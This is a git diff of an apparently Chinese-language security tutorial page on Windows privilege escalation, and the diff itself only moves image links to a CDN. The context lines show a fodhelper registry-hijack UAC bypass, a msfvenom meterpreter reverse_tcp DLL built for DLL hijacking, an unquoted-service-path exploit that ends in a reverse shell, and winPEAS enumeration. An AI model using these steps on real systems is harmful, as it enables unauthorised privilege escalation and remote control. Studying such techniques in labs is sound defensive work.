@@ -318,11 +318,11 @@ Akagi64.exe 编号 调用执行</p>
 通常以shell\open\command命名的键值对存储的是可执行文件路径，静默提升权限后即可运行该键值对程序。</li>
 </ol>
 <p>Procmon监听找到程序注册表信息，过滤</p>
-<p align="center"><img src="/static/img2/6.jpg" alt="img2/6.jpg"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/6.jpg" alt="6.jpg"></p>
 会去查询 `HKCU:\Software\Classes\ms-settings\shell\open\command`，然后在注册表创建该键值对，从而绕过UAC
 <p><strong>注册表劫持绕过</strong></p>
 <h4 id="fodhelperexe">Fodhelper.exe</h4>
-<p align="center"><img src="/static/3240693-20230731221055025-1411728646.png" alt="3240693-20230731221055025-1411728646.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/3240693-20230731221055025-1411728646.png" alt="3240693-20230731221055025-1411728646.png"></p>
 执行注册表写入：
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
 </span></span><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
@@ -330,7 +330,7 @@ Akagi64.exe 编号 调用执行</p>
 <p>执行-x64：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Users\huangzonghui\Desktop\1\msf.exe /f
 </span></span><span style="display:flex;"><span>reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 183641.png" alt="屏幕截图 2025-10-23 183641.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 183641.png" alt="屏幕截图 2025-10-23 183641.png"></p>
 反弹成功，执行getsystem提权
 <hr>
 <h1 id="win系统提权-本地普通用户-dll劫持">Win系统提权-本地普通用户-DLL劫持</h1>
@@ -348,7 +348,7 @@ Akagi64.exe 编号 调用执行</p>
 <li>ChkDllHijack</li>
 <li>火绒剑</li>
 <li>项目：<a href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a>
-<p align="center"><img src="/static/屏幕截图 2025-10-23 185636.png" alt="屏幕截图 2025-10-23 185636.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 185636.png" alt="屏幕截图 2025-10-23 185636.png"></p>
 </li>
 </ol>
 <p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>
@@ -358,11 +358,11 @@ Akagi64.exe 编号 调用执行</p>
 </span></span><span style="display:flex;"><span>./msfvenom -p windows/meterpreter/reverse_tcp lhost=172.27.28.12 lport=4444 -f dll -o shell/ssleay32.dll
 </span></span></code></pre></div><p>上传DLL：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>meterpreter &gt; upload /usr/src/metasploit-framework/shell/libeay32.dll C:\\Users\\huangzonghui\\Desktop\\2\\FlashFXP
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 191425.png" alt="屏幕截图 2025-10-23 191425.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 191425.png" alt="屏幕截图 2025-10-23 191425.png"></p>
 执行成功上线
-<p align="center"><img src="/static/屏幕截图 2025-10-23 191549.png" alt="屏幕截图 2025-10-23 191549.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 191549.png" alt="屏幕截图 2025-10-23 191549.png"></p>
 程序非正常
-<p align="center"><img src="/static/屏幕截图 2025-10-23 191626.png" alt="屏幕截图 2025-10-23 191626.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 191626.png" alt="屏幕截图 2025-10-23 191626.png"></p>
 <hr>
 <h1 id="win系统提权-本地普通用户-未引号服务">Win系统提权-本地普通用户-未引号服务</h1>
 <h2 id="不带引号服务路径配合msf-macroexpert">不带引号服务路径配合MSF-MacroExpert</h2>
@@ -370,14 +370,14 @@ Akagi64.exe 编号 调用执行</p>
 过程：检测服务权限配置 → 制作文件并上传 → 更改服务路径 → 等待调用成功</p>
 <p>检测命令：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wmic service get name,displayname,pathname,startmode |findstr /i &#34;Auto&#34; |findstr /i /v &#34;C:\Windows\\&#34; |findstr /i /v &#34;&#34;&#34;
-</span></span></code></pre></div><p align="center"><img src="/static/屏幕截图 2025-10-23 191957.png" alt="屏幕截图 2025-10-23 191957.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 191957.png" alt="屏幕截图 2025-10-23 191957.png"></p>
 <p>上传反弹exe</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-23 193119.png" alt="屏幕截图 2025-10-23 193119.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 193119.png" alt="屏幕截图 2025-10-23 193119.png"></p>
 <p>设置执行名后，执行：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sc start &#34;Macro Expert&#34;
-</span></span></code></pre></div><p align="center"><img src="/static/Pasted image 20251023193519.png" alt="Pasted image 20251023193519.png"></p>
+</span></span></code></pre></div><p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/Pasted image 20251023193519.png" alt="Pasted image 20251023193519.png"></p>
 反弹成功
-<p align="center"><img src="/static/屏幕截图 2025-10-23 193513.png" alt="屏幕截图 2025-10-23 193513.png"></p>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 193513.png" alt="屏幕截图 2025-10-23 193513.png"></p>
 <hr>
 <h1 id="win系统提权-本地管理用户-不安全权限">Win系统提权-本地管理用户-不安全权限</h1>
 <h2 id="不安全的服务权限配合msf-newservices">不安全的服务权限配合MSF-NewServices</h2>
@@ -394,7 +394,7 @@ Akagi64.exe 编号 调用执行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>winPEAS.bat &gt; result.txt
 </span></span><span style="display:flex;"><span>winPEASany.exe log=result.txt
 </span></span></code></pre></div><p>排查信息，获取有用权限数据</p>
-<p align="center"><img src="/static/屏幕截图 2025-10-23 195206.png" alt="屏幕截图 2025-10-23 195206.png"></p></section>
+<p align="center"><img src="https://cdn.jsdmirror.com/gh/hzhsec/upload@main/屏幕截图 2025-10-23 195206.png" alt="屏幕截图 2025-10-23 195206.png"></p></section>
 
   
   
